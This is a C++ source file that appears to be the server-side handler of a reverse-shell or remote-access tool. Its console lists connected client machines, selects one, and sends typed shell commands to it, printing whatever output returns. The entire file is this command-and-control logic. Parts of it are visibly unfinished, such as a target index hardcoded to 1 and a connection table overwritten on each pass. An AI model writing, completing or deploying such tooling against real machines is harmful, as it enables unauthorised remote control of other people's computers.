#include "server.hxx"

void Server::start_handler()
{
    std::string input;

    while(1) // handle commands
    {
        //handler>
        std::wcout << L"\n\x1B[38;5;159mhandler\x1B[38;2;231;72;86m> \033[0m";
        std::cin >> input;
        
        // -select
        if (input == "select")
        {
            /*
            // create wchar_t array for input
            wchar_t wtarget[4];
            // copy to array
            wcsncpy(wtarget, &input[7], 3);
            // convert to unsigned short int
            unsigned short int target = _wtoi(wtarget);
            */
            unsigned short int target = 1;
            // change target
            // if -1 fail
            if (change_target(target) == -1)
            {
                continue;
            }
            send_commands();
            continue;
        }
        // -list
        else if (input == "list")
        {
            // list connections
            list_connections();
            continue;
        }
        // -help
        else if (input == "help")
        {
            // print help
            handler_print_help();
            continue;
        }
        // -clear
        else if (input == "clear")
        {
            std::wcout << L"\033[2J\033[1;1H";
            continue;
        }
        // -exit
        else if (input == "exit")
        {
            server_free();
            break;
        }
        // invalid command
        else { std::wcout << L"command not recognised\n"; }
    }
    std::wcout << L"out of loop";
}

void Server::handler_print_help()
{
    std::wcout << L"\x1B[38;5;8m========================================================\033[0m\n"
                   "help\t\tShows this help\n"
                   "list\t\tLists connected clients\n"
                   "select\t\tSelects a client by its index\n"
                   "exit|quit\tStops current connections with a client\n"
                   "shutdown\tShuts server down\n"
                   "\x1B[38;5;8m========================================================\033[0m";
}


int Server::list_connections()
{
    // check if empty
    if (connections.empty()) { 
        std::wcout << warn << L"no connections\n";
        return 0;
    }

    int error_code = 1;
    int error_code_len = sizeof(int);
    wchar_t sockinfo[500];
    //std::ostringstream results; std::string list;
    // loop through connections
    for (std::size_t i = 0; i < connections.size(); i++)
    {
        try {
            // check all elements in vector can communicate with the server
            getsockopt(connections[i], SOL_SOCKET, SO_ERROR, (char*)&error_code, &error_code_len);
        }
        catch(...) {
            connections.erase(connections.begin() + (i - 1));
            //all_addresses.erase(all_addresses.begin() + (i - 1));
            continue;
        }
        // get address of socket
        struct sockaddr_in sin;
        socklen_t len = sizeof(sin);
        if (getsockname(connections[i], (struct sockaddr *)&sin, &len) == -1)
        {
            std::cerr << failed << L"Error getting socket name! Error: \n" << WSAGetLastError();
        }
        //TODO: this will probably stop working with multiple clients // also 500 probably isnt a good number haha
        swprintf(sockinfo, 500, L"| %zu\t | %hs\t | %d\t  | \n", i + 1, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
    }

    std::wcout  << L"\n/\x1B[38;5;8m=================================\033[0m\\\n"
                <<              L"| INDEX\t | IP-ADDRESS\t | PORT\t  |\n"
                << L"|\x1B[38;5;8m=================================\033[0m|\n"
                <<                              sockinfo
                << L"\\\x1B[38;5;8m=================================\033[0m/\n";
    return 0;
}

int Server::change_target(unsigned short int target)
{
    // if target is in range
    if (target > 0 && target <= connections.size())
    {
        // set new target
        clientSocket = connections[target - 1];
        return 0;
    }
    else
    {
        std::wcout << warn << L"Not a valid selection - out of range\n";
        return -1;
    }
}

int Server::send_commands()
{   
    while(1)
    {
        // wipe buffers
        SecureZeroMemory(&inputUser, sizeof(inputUser));
        SecureZeroMemory(&rdata, sizeof(rdata));
        //printf("shell::> ");
        std::cout << "\n\x1B[38;5;8mshell\x1B[38;2;231;72;86m> \033[0m";
        //fgets(inputUser, sizeof(inputUser), stdin);
        std::cin.getline(inputUser, sizeof(inputUser));
        strtok(inputUser, "\n");
        std::cout << "got input: " << inputUser << "\n";

        
        // if the letter "q" is in users input then quit
        if (strncmp("quit", inputUser, 4) == 0 || strncmp("exit", inputUser, 4) == 0)
        {
            //printf("break\n");
            //closesocket(clientSocket);
            break;
        }
        if (strncmp("shutdown", inputUser, 8) == 0)
        {
            shutdown(clientSocket, SD_BOTH);
            closesocket(clientSocket);
            server_free();
            break;
        }

        else
        {
            // send the command to the client
            send(clientSocket, inputUser, sizeof(inputUser), 0);
            std::cout << "sent input: " << inputUser << "\n";
            // now start receiving commands
            //printf("receiving\n");
            //encode utf8 then decode, do not send and rec wide chars.
            recv(clientSocket, rdata, sizeof(rdata), MSG_WAITALL);
            //printf("received: %s\n", rdata);
            std::cout << rdata;
            continue;
        }
    }
    //shutdown(clientSocket, SD_BOTH);
    //closesocket(clientSocket);
    return 0;
}